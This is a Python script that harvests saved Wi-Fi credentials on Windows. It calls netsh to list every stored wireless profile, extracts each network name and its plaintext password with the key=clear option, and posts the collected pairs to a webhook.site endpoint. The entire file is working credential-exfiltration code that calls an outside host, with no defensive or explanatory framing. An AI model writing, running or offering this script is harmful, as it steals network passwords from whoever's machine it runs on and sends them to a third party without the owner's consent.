import subprocess, os, sys, requests, xmltodict, re, urllib

url = 'https://webhook.site/#####################'
found_ssids = []
pwnd = []
wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
wlan_key_regex = r"Key Content\s+:\s(.*)$"


get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()

matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
for match in matches:
    for group in match.groups():
        found_ssids.append(group.strip())

for ssid in found_ssids:
    get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode()
    matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
    for match in matches:
        for group in match.groups():
            pwnd.append({
                "SSID":ssid,
                "Password":group.strip()
                }) 

if len(pwnd) == 0: # Early return if no data found
    print("No Wi-Fi profiles found. Exiting...")
    sys.exit()

print("Wi-Fi profiles found. Check your webhook...")

final_payload = ""
for pwnd_ssid in pwnd:
    final_payload += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired

r = requests.post(url, params="format=json", data=final_payload)
